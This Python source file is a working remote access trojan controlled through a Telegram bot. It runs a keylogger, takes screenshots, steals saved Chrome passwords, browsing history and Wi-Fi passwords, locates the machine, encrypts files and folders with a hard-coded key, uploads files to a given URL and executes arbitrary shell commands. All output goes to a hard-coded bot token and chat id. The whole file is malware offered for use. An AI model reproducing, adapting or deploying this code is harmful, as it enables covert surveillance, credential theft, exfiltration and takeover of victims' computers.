from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import subprocess
import time
import requests
import threading
import pyautogui
import socket  
import os 
import sqlite3
from os import listdir
from os.path import isfile,join
from Chrom_pass import Chrome_passwords
from Crypt_my import Crypt_my101
from advanced_file_search import Advanced_files_search
from delete_files import Delet_files
from urllib.request import urlopen
from bs4 import BeautifulSoup
from wifi_info import Wifi_information
import json

print('start')


key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
telegram_token = 'Your telegram bot token'
chat_id = 'chat id'

telegram_token = '5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho'
chat_id = '-791347020'
keys=[]
count=0

def send_message(message):
    message=str(message)
    if len(message)>3900:
        message=bytes(message,encoding='ISO-8859-1')
        files={'document':message}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt",files=files )
    else:
        requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)


def send_files(path,type_file,name):
    if type_file == 'txt':
        type_file1="document"
    elif type_file=='image':
         type_file1='photo'

    if '\\'in str(path[:10]):
        files={type_file1:open(path,'rb')}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/send"+type_file.capitalize()+"?chat_id="+chat_id+"&caption=output.txt",files=files )
    else:
        print(type_file1,type_file)
        files={type_file1:path}
        type_file1=type_file1.capitalize()
        print('\n'+"https://api.telegram.org/bot"+telegram_token+"/send"+type_file1+"?chat_id="+chat_id+"&caption="+name+'.'+type_file+'\n')
        requests.post("https://api.telegram.org/bot"+telegram_token+"/send"+type_file1+"?chat_id="+chat_id+"&caption="+name+'.'+type_file ,files=files)

       
def ip_information():
    r = requests.get(r'http://jsonip.com')
    ip= r.json()['ip']
    IP= format(ip)
    public_ip = IP
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)
    ip_in=['public: '+public_ip,'host name: '+hostname,"private: "+IPAddr]
    return ip_in
    


def upload_files(url,file):
    if file[-1]=='\\':
        all_files = [f for f in listdir(file) if isfile(join(file, f))]
        res_ture=['successfully Upload file:'+'\n'+('='*25)+'\n']
        res_false=['upload failed:'+'\n'+('='*25)+'\n']
        for i in all_files:
            file_ = {"file": open(file+i, "rb")}
            responseVar = requests.post(url, files = file_)
            if responseVar.ok:
                res_ture.append(i+'\n')
            else:
                res_false.append(i+'\n')
            if len(res_ture)<=1:
                res_ture=[]
            if len(res_false)<=1:
                res_false=[]
                
            if len(res_ture)>0 and len(res_false)>0:
                res_ture.append('\n'*5)
                
        return res_ture+res_false

    else:
        file = {"file": open(file, "rb")}

        responseVar = requests.post(url, files = file)
        if responseVar.ok:
            return 'successfully Upload file!'
        else:
            return "upload failed.. "




def get_current_location():
    url = "https://mylocation.org/"
    html = urlopen(url).read()
    data = BeautifulSoup(html, features="html.parser")
    for i in data(["script", "style"]):
        i.extract()  
    text = data.get_text()
    lines = (line.strip() for line in text.splitlines())
    p = (phrase.strip() for line in lines for phrase in line.split("  "))
    text = '\n'.join(p for p in p if p)
    text=text.split('\n')
    c_l=[]
    for i in range (len(text)):
        if 'Public IP Address:'in text[i]:
            for n in range(i+1,i+15) :
                c_l.append(text[n])
            break
    pc_l1=c_l[::2]
    pc_l2=c_l[1::2]
    
    res=''
    for i in range(len(pc_l1)):
        res+=(f"{str(pc_l1[i]):<20}{pc_l2[i]:>20}")
        res+=('\n')
    return res




def histoty_chrome(num):
    p = subprocess.Popen('chdir C:\\Process\\ && mkdir sih', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    all_files = [f for f in listdir('C:\\Process\\sih') if isfile(join('C:\\Process\\sih', f))]
    for i in all_files:
        p = subprocess.Popen('del "C:\\Process\\sih\\'+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
    try:
        num=int(num)
    except:
        num = 'all'
    username=os.getlogin()
            
            
    possible_folders=['Guest Profile','Default']
    for i in os.listdir("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data"):
        if 'Profile ' in i:
            possible_folders.append(i)
        
    res_path=[]  
    for i in possible_folders:
        files=open("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\"+i+"\\History",'rb')
        with open("C:\\Process\\sih\\sih_file", 'wb')as file:
            file.write(files.read())

        

        history_db = ("C:\\Process\\sih\\sih_file")
        c = sqlite3.connect(history_db)
        cursor = c.cursor()
        select_statement=""" SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),
                            url 
                     FROM urls
                     ORDER BY last_visit_time DESC
                 """
        cursor.execute(select_statement)
        results = cursor.fetchall()
        p = subprocess.Popen('del "C:\\Process\\sih\\'+'sih_file'+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        if num !='all'and len(results)>=num:
            num_range=num
        else:
            num_range=len(results)
        data=''
        for n in range(num_range):
            dbstr=str(results[n])
            data+=(dbstr)
            data+=('\n')
            data+=("-"*50)
            data+=('\n'*2)
        i=i.replace('Profile','sec').replace('Default','iom')
        with open('C:\\Process\\sih\\'+i+'.txt','wb') as file:
            file.write(Crypt_my101(key_crypt).encrypt_data(data.encode()))
        data=''
        res_path.append('C:\\Process\\sih\\'+i+'.txt')
    return res_path
     
        


def screen_shot(name):
    p = subprocess.Popen("chdir C:\\Process\\ && mkdir neercs", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    save_image_path= 'C:\\Process\\neercs\\'+name+'.jpg'
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save(save_image_path)
    
    with open(save_image_path,'rb')as file:
            data=file.read() 
    Crypt_my101(key_crypt).encrypt_files(save_image_path)
    
    files={'photo':data}
    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".png" ,files=files)
    
    try:
        Delet_files().delet_one_file(save_image_path)
    except Exception as e:
        print(e)


def on_press(key):
    global count,keys
    keys.append(key)
    count+=1
    
    if count>=1:
        write_to_file(keys)
        keys=[]
        count=0

        
def write_to_file(keys):
    with open('C:\\Process\\Process.txt','ab')as file:
        for i in keys:
            i=str(i)
            file.write(Crypt_my101(key_crypt).encrypt_data(i))
            file.write(b'\n')
            
            

def capture_data():
    data=''
    count_key=0
    key_red_list=[' <Shift> ',' <Backspace> ',' <Ctrl> ',' <Caps_lock> ',' <Left> ',' <Right> '," <Down> "," <Up> ",' <Alt> ',' <Tab> ']
    with open('C:\\Process\\Process.txt','rb')as file:
            for i in file:
                s=Crypt_my101(key_crypt).decrypt_data(i)
                s=s.replace("'","")
                print(s)
                if "backspace" in s:
                    s=' <'+"Backspace"+'> '
                elif 'space' in s:
                    s=' '
                elif 'enter' in s:
                    s='\n'
                elif 'shift' in s:
                    s=' <'+'Shift'+'> '
                elif "caps_lock" in s:
                    s=' <'+"Caps_lock"+'> '
                elif "ctrl" in s:
                    s=" <"+'Ctrl'+"> "
                elif '\\x03' in s:
                    s='(c) '
                elif '\\x16' in s:
                    s='(v) '
                elif 'left' in s:
                    s=' <Left> '
                elif 'right' in s:
                    s=' <Right> '
                elif 'down'in s:
                    s=" <Down> "
                elif 'up' in s:
                    s=" <Up> "
                elif 'alt'in s:
                    s=' <Alt> '
                elif 'tab' in s:
                    s=' <Tab> '
                else:
                    s=s
            
                if s==data[-len(s):]and s in key_red_list:
                    count_key+=1
                else:
                    if count_key>1:
                        data=data[:-2]+"("+(str(count_key))+')> '+s
                        count_key=0
                    else:
                        data+=s
            
            if count_key>1:
                data=data[:-2]+"("+(str(count_key))+')> '
                count_key=0
            if len(data)>0:
                data=bytes(data,encoding='utf8')
                files={'document':data}
                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=keylogger.txt" ,files=files)
            else:
                send_message('keylogger is empty.')
            
            file.close()
    f=open('C:\\Process\\Process.txt','w')
    f.write('')

    

def read_messages():
    global offset,message_data
    base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='+offset
    resp = requests.get(base_url)
    messages=resp.text
    messages=messages.replace("update_id","^^^@^@").split('^^^')
    messages=messages[-1]        
    messages=str(messages)

    offset=''
    for i in range(len(messages)):
        if messages [i:i+3]=='@^@':
            for n in range(i+5,10000):
                if messages[n]!=',':
                    offset+=messages[n]
                else:
                    break
            break

    time.sleep(0.6)
    message_data=''
    for i in range(len(messages)):
        if messages[i:i+4] == 'text':
            for n in range(i+7,100000):
                if messages[n:n+5]!='"}}]}' and messages[n:n+12]!=',"entities":':
                       message_data+=messages[n]
                else:
                    break
            break
    return [message_data[1:-1],offset]
    

def start_project():
        global offset,key_crypt
        offset=''
        ffo=0
        c=0
        while True:
            try:
                conect_ip=ip_information()
                send_message("New connection!\n"f"{'IP':<15}{conect_ip[0][8:]:>15}"+'\n'+f"{'Host name':<15}{conect_ip[1][11:]:>15}"+'\n'+f"{'User name':<15}{str(os.getlogin())+'':>15}")
                break
            except Exception as e:
                print(e)
                time.sleep(4)

        while True:
            try:
                time.sleep(0.5)
                command=read_messages()
                off=command[-1]
                command=command[0]
                
                if off!=ffo:
                    print(command)
                    c+=1
                    ffo=off
                    if c>1:
                        print(command,'0')
                        if "capture keylogger" in command:
                            capture_data()
                            
                        
                        elif command[:12]== "encrypt file":
                            send_message(Crypt_my101(key_crypt).encrypt_files(command[13:]))
                        elif command [:12]== "decrypt file":
                           send_message(Crypt_my101(key_crypt).decrypt_files(command[13:]))
                        elif command[:14]=='encrypt folder' and '-s'not in command[:18]:
                            Crypt_my101(key_crypt).recursive_encrypt_files(command[15:])
                        elif command[:14]=="decrypt folder" and '-s'not in command[:18]:
                            Crypt_my101(key_crypt).recursive_decrypt_files(command[15:])
                        elif command[:17]=='encrypt folder -s':
                            send_message(Crypt_my101(key_crypt).sync_recursive_encrypt_files(command[18:]))


                        elif 'get ip info' in command:
                            data=''
                            for i in conect_ip:
                                data+=i+'\n'
                            send_message(data)


                        elif "screen shot" in command:
                            screen_shot('img')

                        elif "search file -g" in command:
                            command=command.split('name=')
                            output=Advanced_files_search(command[0][15:-1],command[-1]).search_files_gen()
                            if len(output)>1:
                                send_message(output)
                            else:
                                send_message(command[-1]+'not found..')


                        elif 'get chrome passwords'in command:
                            passwords=Chrome_passwords().chrome_password_steal()
                            names=passwords[::2]
                            passwords=passwords[1::2]
                            for i in range(len(passwords)):
                                data=passwords[i]
                                files={'document':data}
                                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption="+str(names[i])+".txt" ,files=files)
                            passwords=''
                        
                        elif "searsh chrome password" in command:
                            passwords=Chrome_passwords().advanced_search(command[23:])
                            for i in passwords:
                                send_message(i)


                        elif 'get location'in command:
                            send_message(get_current_location())

                        elif "get wifi passwords" in command:
                            send_message(Wifi_information().wifi_passwords())
                        elif 'get wifi information' in command:
                            password=Wifi_information().wifi_info_exp()
                            data=''
                            for i in password:
                                try:
                                    data+=bytes(i,encoding='ISO-8859-1')
                                except:
                                    data+=i
                            files={'document':data}
                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=wifi.txt" ,files=files)
                            data=''


                        elif 'get chrome history' in command:
                            pathes=histoty_chrome(command[19:])
                            print(command[19:])
                            for i in pathes:
                                with open(i,'rb') as file:
                                    data=Crypt_my101(key_crypt).decrypt_data(file.read())
                                file.close()
                                n=i[15:].replace('sec','Profile').replace('iom','Default')
                                files={'document':data}
                                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption="+n+'.txt' ,files=files)
                            Delet_files().delet_files_list('C:\\Process\\sih\\')
                                
                        

                        elif "capture all passwords" in command:
                            passwords=Chrome_passwords().chrome_password_steal()
                            names=passwords[::2]
                            passwords=passwords[1::2]
                            data=''
                            for i in range(len(passwords)):
                                data=names[i].decode()+'\n'+"="*(len(names[i]))+passwords[i].decode()+'\n'*5
                            files={'document':data.encode()}
                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption="+str("chrome")+".txt" ,files=files)
                            passwords=''
                            password=Wifi_information().wifi_info_exp()
                            data=''
                            for i in password:
                                try:
                                    data+=bytes(i,encoding='ISO-8859-1')
                                except:
                                    data+=i
                            files={'document':data}
                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=wifi.txt" ,files=files)
                            data=''



                        elif 'get files' in command:
                            command=command.replace('path=','^`^').replace('url=','^`^').split('^`^')
                            t=0
                            output_data=''
                            for i in upload_files(command[1],command[-1]):
                                output_data+=i
                                t+=1
                            if t<=2:
                                send_message(output_data)
                            else:
                                files={'document':output_data.encode()}
                                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt" ,files=files)
                            output_data=''





                        else:
                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                            data=''
                            for i in p.stdout.readlines():
                                data+=i.decode(encoding='ISO-8859-1')
                            print(data)        
                            p.wait
                            send_message(data)

            except Exception as e:
                e=str(e)
                try:
                    send_message(e)
                except Exception as e:
                    print(e)  
                time.sleep(3)
            time.sleep(2)                          
        
       
def start_key_log():
    with Listener(on_press=on_press) as listener:
        listener.join()


def main():
    p = subprocess.Popen('chdir C:\\ && mkdir Process', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdout.readline()
    Delet_files().recursive_fles_delete('C:\\Process\\')
    Thread1 = threading.Thread(target=start_project)
    Thread2 = threading.Thread(target=start_key_log)
    Thread1.start()
    Thread2.start()
    Thread1.join()
    Thread2.join()



if __name__=="__main__":
    main()
